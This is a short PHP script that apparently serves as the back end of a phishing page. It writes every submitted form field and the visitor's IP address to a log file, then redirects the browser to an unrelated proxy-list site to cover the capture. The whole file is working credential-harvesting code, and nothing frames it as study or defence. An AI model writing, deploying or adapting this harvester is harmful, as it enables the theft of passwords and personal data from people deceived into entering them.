<?php

$ip = $_SERVER['REMOTE_ADDR']; //get supposed IP

$handle = fopen("log.txt", "a"); //open log file

foreach($_POST as $variable => $value) { //loop through POST vars
   fwrite($handle, $variable . "+" . $value . "\r\n");
}
fwrite($handle, "IP: $ip \r\n \r\n");
fclose($handle);

header ('Location: http://proxy4free.com');
exit;